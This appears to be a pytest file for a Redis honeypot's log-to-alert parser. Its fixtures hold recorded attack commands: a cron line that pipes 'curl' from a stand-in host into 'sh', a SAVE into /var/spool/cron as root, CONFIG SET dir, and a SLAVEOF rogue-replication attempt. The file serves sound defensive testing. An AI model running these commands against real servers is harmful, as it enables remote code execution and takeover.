import importlib.util
import sys
import types
from pathlib import Path


class FakeEAlert:
    instances = []

    def __init__(self, modul, ecfg):
        self.modul = modul
        self.ecfg = ecfg
        self.lines = list(ecfg['test_lines'])
        self.data_values = {}
        self.request_values = {}
        self.additional_data = {}
        self.alerts = []
        self.finished = False
        FakeEAlert.instances.append(self)

    def readCFG(self, items, cfgfile):
        return {
            'redishoneypot': 'true',
            'nodeid': 'redishoneypot-test',
            'logfile': '/tmp/redishoneypot.log',
        }

    def lineREAD(self, filename, line_format):
        if not self.lines:
            return ()
        return self.lines.pop(0)

    def data(self, key, value):
        self.data_values[key] = value

    def request(self, key, value):
        self.request_values[key] = value

    def adata(self, key, value):
        self.additional_data[key] = value

    def buildAlert(self):
        self.alerts.append({
            'data': self.data_values.copy(),
            'request': self.request_values.copy(),
            'additionaldata': self.additional_data.copy(),
        })
        self.data_values.clear()
        self.request_values.clear()
        self.additional_data.clear()
        return True

    def finAlert(self):
        self.finished = True


def load_redishoneypot_module(monkeypatch):
    fake_modules = types.ModuleType('modules')
    fake_modules.__path__ = []
    fake_ealert = types.ModuleType('modules.ealert')
    fake_ealert.EAlert = FakeEAlert

    monkeypatch.setitem(sys.modules, 'modules', fake_modules)
    monkeypatch.setitem(sys.modules, 'modules.ealert', fake_ealert)

    module_path = Path(__file__).resolve().parents[1] / 'honeypots' / 'redishoneypot.py'
    spec = importlib.util.spec_from_file_location('redishoneypot_under_test', module_path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def run_redishoneypot(monkeypatch, lines):
    FakeEAlert.instances = []
    redishoneypot_module = load_redishoneypot_module(monkeypatch)

    ecfg = {
        'cfgfile': '/tmp/ews.cfg',
        'hostname': 'sensor-01',
        'ip_ext': '198.51.100.20',
        'ip_int': '10.0.0.5',
        'uuid': 'sensor-uuid',
        'test_lines': lines,
    }

    redishoneypot_module.redishoneypot(ecfg)
    return FakeEAlert.instances[0], redishoneypot_module


def test_command_events_are_mapped_to_ews_alerts(monkeypatch):
    lines = [
        {
            'timestamp': '2026-06-16T16:16:57.417861509Z',
            'level': 'INFO',
            'message': 'connect',
            'event': 'connect',
            'protocol': 'redis',
            'network': 'tcp',
            'profile': 'legacy6',
            'session_id': 'session-1',
            'client_id': 3,
            'src_ip': '172.22.0.1',
            'src_port': 59444,
            'dest_ip': '172.22.0.2',
            'dest_port': 6379,
            'session_start': '2026-06-16T16:16:57.417699135Z',
        },
        {
            'timestamp': '2026-06-16T16:16:57.418392675Z',
            'level': 'INFO',
            'message': 'command',
            'event': 'command',
            'protocol': 'redis',
            'network': 'tcp',
            'profile': 'legacy6',
            'session_id': 'session-1',
            'client_id': 3,
            'src_ip': '172.22.0.1',
            'src_port': 59444,
            'dest_ip': '172.22.0.2',
            'dest_port': 6379,
            'session_start': '2026-06-16T16:16:57.417699135Z',
            'session_duration': 0.000688832,
            'session_duration_ms': 0,
            'client_library_name': 'container-smoketest',
            'user_agent': 'container-smoketest',
            'redis_db': 0,
            'command': 'SET',
            'command_category': 'write',
            'arg_count': 2,
            'response_class': 'simple_string',
            'response_bytes': 5,
            'outcome': 'success',
            'close_after_command': False,
            'args_text': 'smoke-key smoke-value',
            'args_truncated': False,
            'args_sha256': '3893be80bc0b2d59314d66faf0b5b80fdfc42eb5e2efa214897d815d2f4a461f',
            'analysis_hint': 'redis_set',
            'key': 'smoke-key',
            'key_count': 1,
            'value_size': 11,
            'value_sha256': '656bacf87e249e74405c09eb79525f3a2a05207aadbbf1c9d04e5a62ca2edff8',
        },
        {
            'timestamp': '2026-06-16T16:16:57.419122382Z',
            'level': 'INFO',
            'message': 'close',
            'event': 'close',
            'protocol': 'redis',
            'network': 'tcp',
            'profile': 'legacy6',
            'session_id': 'session-1',
            'client_id': 3,
            'src_ip': '172.22.0.1',
            'src_port': 59444,
            'dest_ip': '172.22.0.2',
            'dest_port': 6379,
            'session_end': '2026-06-16T16:16:57.419120882Z',
        },
    ]

    fake_alert, redishoneypot_module = run_redishoneypot(monkeypatch, lines)

    assert fake_alert.finished is True
    assert len(fake_alert.alerts) == 1

    alert = fake_alert.alerts[0]
    assert alert['data'] == {
        'analyzer_id': 'redishoneypot-test',
        'timestamp': '2026-06-16 16:16:57',
        'timezone': redishoneypot_module.time.strftime('%z'),
        'source_address': '172.22.0.1',
        'target_address': '198.51.100.20',
        'source_port': '59444',
        'target_port': '6379',
        'source_protocol': 'tcp',
        'target_protocol': 'tcp',
    }
    assert alert['request'] == {
        'description': 'Redis Honeypot',
        'request': 'SET smoke-key smoke-value',
    }
    assert alert['additionaldata']['session_id'] == 'session-1'
    assert alert['additionaldata']['client_id'] == 3
    assert alert['additionaldata']['session_start'] == '2026-06-16T16:16:57.417699135Z'
    assert alert['additionaldata']['session_duration'] == 0.000688832
    assert alert['additionaldata']['session_duration_ms'] == 0
    assert alert['additionaldata']['protocol'] == 'redis'
    assert alert['additionaldata']['profile'] == 'legacy6'
    assert alert['additionaldata']['client_library_name'] == 'container-smoketest'
    assert alert['additionaldata']['user_agent'] == 'container-smoketest'
    assert alert['additionaldata']['redis_db'] == 0
    assert alert['additionaldata']['command'] == 'SET'
    assert alert['additionaldata']['command_category'] == 'write'
    assert alert['additionaldata']['arg_count'] == 2
    assert alert['additionaldata']['response_class'] == 'simple_string'
    assert alert['additionaldata']['response_bytes'] == 5
    assert alert['additionaldata']['outcome'] == 'success'
    assert alert['additionaldata']['close_after_command'] is False
    assert alert['additionaldata']['args_text'] == 'smoke-key smoke-value'
    assert alert['additionaldata']['args_truncated'] is False
    assert alert['additionaldata']['args_sha256'] == '3893be80bc0b2d59314d66faf0b5b80fdfc42eb5e2efa214897d815d2f4a461f'
    assert alert['additionaldata']['analysis_hint'] == 'redis_set'
    assert alert['additionaldata']['key'] == 'smoke-key'
    assert alert['additionaldata']['key_count'] == 1
    assert alert['additionaldata']['value_size'] == 11
    assert alert['additionaldata']['value_sha256'] == '656bacf87e249e74405c09eb79525f3a2a05207aadbbf1c9d04e5a62ca2edff8'
    assert alert['additionaldata']['hostname'] == 'sensor-01'
    assert 'event' not in alert['additionaldata']
    assert 'timestamp' not in alert['additionaldata']
    assert 'src_ip' not in alert['additionaldata']
    assert 'dest_ip' not in alert['additionaldata']


def test_command_event_uses_target_defaults_and_skips_malformed(monkeypatch):
    lines = [
        {
            'timestamp': 'not-a-date',
            'event': 'command',
            'src_ip': '203.0.113.10',
            'command': 'PING',
        },
        {
            'timestamp': '2026-06-16T16:16:57Z',
            'event': 'command',
            'network': 'tcp',
            'src_ip': '203.0.113.10',
            'src_port': 50000,
            'command': 'CONFIG',
            'args_text': 'SET dir /tmp',
            'command_category': 'recon',
            'args_sha256': '97751ec7a771e38d3371e6b92520ce3782bb6905ef9a106ba6efc35aa3e060f4',
            'analysis_hint': 'redis_write_file_attempt',
            'config_key': 'dir',
            'config_value': '/tmp',
        },
        {
            'timestamp': '2026-06-16T16:16:57Z',
            'event': 'command',
            'src_ip': '203.0.113.11',
            'command': 'GET',
        },
    ]

    fake_alert, _ = run_redishoneypot(monkeypatch, lines)

    assert len(fake_alert.alerts) == 1
    alert = fake_alert.alerts[0]
    assert alert['data']['target_address'] == '198.51.100.20'
    assert alert['data']['target_port'] == '6379'
    assert alert['request']['request'] == 'CONFIG SET dir /tmp'
    assert alert['additionaldata']['command_category'] == 'recon'
    assert alert['additionaldata']['args_sha256'] == '97751ec7a771e38d3371e6b92520ce3782bb6905ef9a106ba6efc35aa3e060f4'
    assert alert['additionaldata']['analysis_hint'] == 'redis_write_file_attempt'
    assert alert['additionaldata']['config_key'] == 'dir'
    assert alert['additionaldata']['config_value'] == '/tmp'


# Command events recorded from the RedisHoneyPot container (persona redis74)
# after a cron file-write attempt, a Lua call, a replication attempt and an
# HTTP request.
NEXT_BRANCH_ATTACK_LINES = [
    {
        "timestamp": "2026-10-09T13:11:21.998234336Z",
        "level": "INFO",
        "message": "command",
        "event": "command",
        "protocol": "redis",
        "network": "tcp",
        "profile": "redis74",
        "client_id": 5,
        "src_ip": "203.0.113.10",
        "src_port": 30447,
        "dest_ip": "172.22.0.2",
        "dest_port": 6379,
        "session_start": "2026-10-09T13:11:21.996389795Z",
        "session_duration": 0.001801666,
        "session_duration_ms": 1,
        "redis_db": 0,
        "command": "SET",
        "command_category": "write",
        "arg_count": 2,
        "response_class": "simple_string",
        "response_bytes": 5,
        "outcome": "success",
        "close_after_command": False,
        "args_text": "backup1 \n\n*/2 * * * * curl -fsSL http://updates.example.net/init.sh | sh\n\n",
        "args_truncated": False,
        "args_sha256": "0d4a1cf4ed2ee4a47dc6e3540800456364154aefd061ac77ae52c5e7c43d9628",
        "analysis_hint": "cron_payload",
        "key": "backup1",
        "key_count": 1,
        "value_size": 66,
        "value_sha256": "3452aa887a3207dc9f998d8c84c093590578ee13c27bcbd0c14248ce6883f6a5",
        "value_text": "\n\n*/2 * * * * curl -fsSL http://updates.example.net/init.sh | sh\n\n",
        "value_truncated": False,
        "ioc_urls": "http://updates.example.net/init.sh",
        "ioc_domains": "updates.example.net",
        "ioc_count": 2,
        "session_id": "session-2"
    },
    {
        "timestamp": "2026-10-09T13:11:21.998687545Z",
        "level": "INFO",
        "message": "command",
        "event": "command",
        "protocol": "redis",
        "network": "tcp",
        "profile": "redis74",
        "client_id": 5,
        "src_ip": "203.0.113.10",
        "src_port": 30447,
        "dest_ip": "172.22.0.2",
        "dest_port": 6379,
        "session_start": "2026-10-09T13:11:21.996389795Z",
        "session_duration": 0.002292791,
        "session_duration_ms": 2,
        "redis_db": 0,
        "command": "SAVE",
        "command_category": "persistence",
        "arg_count": 0,
        "response_class": "simple_string",
        "response_bytes": 5,
        "outcome": "success",
        "close_after_command": False,
        "analysis_hint": "redis_write_file_commit",
        "target_dir": "/var/spool/cron",
        "target_dbfilename": "root",
        "session_id": "session-2"
    },
    {
        "timestamp": "2026-10-09T13:11:21.999128128Z",
        "level": "INFO",
        "message": "command",
        "event": "command",
        "protocol": "redis",
        "network": "tcp",
        "profile": "redis74",
        "client_id": 5,
        "src_ip": "203.0.113.10",
        "src_port": 30447,
        "dest_ip": "172.22.0.2",
        "dest_port": 6379,
        "session_start": "2026-10-09T13:11:21.996389795Z",
        "session_duration": 0.002730916,
        "session_duration_ms": 2,
        "redis_db": 0,
        "command": "EVAL",
        "command_category": "scripting",
        "arg_count": 2,
        "response_class": "integer",
        "response_bytes": 4,
        "outcome": "success",
        "close_after_command": False,
        "args_text": "return 1 0",
        "args_truncated": False,
        "args_sha256": "3f24d75dde372b231bbf3167c2944bfe3fc37d313feeec2f0e9180e22d378b1c",
        "analysis_hint": "redis_lua_eval",
        "script_sha1": "e0e1f9fabfc9d4800c877a703b823ac0578ff8db",
        "script_sha256": "486d9affb60dbb0063b03d8e23a6ccf6364ce203dc3a9f56f20e750eb41ecade",
        "script_size": 8,
        "script_text": "return 1",
        "script_truncated": False,
        "script_numkeys": 0,
        "session_id": "session-2"
    },
    {
        "timestamp": "2026-10-09T13:11:21.999583545Z",
        "level": "INFO",
        "message": "command",
        "event": "command",
        "protocol": "redis",
        "network": "tcp",
        "profile": "redis74",
        "client_id": 5,
        "src_ip": "203.0.113.10",
        "src_port": 30447,
        "dest_ip": "172.22.0.2",
        "dest_port": 6379,
        "session_start": "2026-10-09T13:11:21.996389795Z",
        "session_duration": 0.003173041,
        "session_duration_ms": 3,
        "redis_db": 0,
        "command": "SLAVEOF",
        "command_category": "replication",
        "arg_count": 2,
        "response_class": "simple_string",
        "response_bytes": 5,
        "outcome": "success",
        "close_after_command": False,
        "args_text": "198.51.100.23 8886",
        "args_truncated": False,
        "args_sha256": "ecac33685882339491d7c4a1e5db9434ce2d92c21b56221093d686e19ef7c51c",
        "analysis_hint": "redis_replication_attempt",
        "replica_host": "198.51.100.23",
        "replica_port": "8886",
        "ioc_ips": "198.51.100.23",
        "ioc_count": 1,
        "session_id": "session-2"
    },
    {
        "timestamp": "2026-10-09T13:11:22.096923878Z",
        "level": "INFO",
        "message": "command",
        "event": "command",
        "protocol": "redis",
        "network": "tcp",
        "profile": "redis74",
        "client_id": 6,
        "src_ip": "203.0.113.10",
        "src_port": 59297,
        "dest_ip": "172.22.0.2",
        "dest_port": 6379,
        "session_start": "2026-10-09T13:11:22.096812128Z",
        "session_duration": 0.000100666,
        "session_duration_ms": 0,
        "redis_db": 0,
        "command": "POST",
        "command_category": "unknown",
        "arg_count": 2,
        "response_class": "raw",
        "response_bytes": 0,
        "outcome": "connection_closed",
        "close_after_command": True,
        "args_text": "/ HTTP/1.1",
        "args_truncated": False,
        "args_sha256": "c9a0aaa820b24f70740e9971b478ab6f11c0cc9a0125809a762a1e64f049c2c3",
        "session_id": "session-2"
    }
]


def test_payload_script_and_ioc_fields_are_forwarded(monkeypatch):
    fake_alert, _ = run_redishoneypot(monkeypatch, NEXT_BRANCH_ATTACK_LINES)

    assert len(fake_alert.alerts) == 5
    set_alert, save_alert, eval_alert, slaveof_alert, post_alert = fake_alert.alerts

    for alert in fake_alert.alerts:
        assert alert['data']['target_address'] == '198.51.100.20'
        assert alert['data']['source_address'] == '203.0.113.10'
        assert alert['additionaldata']['profile'] == 'redis74'
        assert 'dest_ip' not in alert['additionaldata']
        for value in alert['additionaldata'].values():
            assert isinstance(value, (str, int, float, bool))

    set_data = set_alert['additionaldata']
    assert set_data['analysis_hint'] == 'cron_payload'
    assert set_data['value_text'].startswith('\n\n*/2 * * * * curl')
    assert set_data['value_truncated'] is False
    assert set_data['ioc_urls'] == 'http://updates.example.net/init.sh'
    assert set_data['ioc_domains'] == 'updates.example.net'
    assert set_data['ioc_count'] == 2

    save_data = save_alert['additionaldata']
    assert save_data['analysis_hint'] == 'redis_write_file_commit'
    assert save_data['target_dir'] == '/var/spool/cron'
    assert save_data['target_dbfilename'] == 'root'

    eval_data = eval_alert['additionaldata']
    assert eval_data['analysis_hint'] == 'redis_lua_eval'
    assert eval_data['script_sha1'] == 'e0e1f9fabfc9d4800c877a703b823ac0578ff8db'
    assert eval_data['script_text'] == 'return 1'
    assert eval_data['script_size'] == 8
    assert eval_data['script_numkeys'] == 0
    assert eval_alert['request']['request'] == 'EVAL return 1 0'

    slaveof_data = slaveof_alert['additionaldata']
    assert slaveof_data['replica_host'] == '198.51.100.23'
    assert slaveof_data['ioc_ips'] == '198.51.100.23'

    assert post_alert['additionaldata']['outcome'] == 'connection_closed'
    assert post_alert['request']['request'] == 'POST / HTTP/1.1'
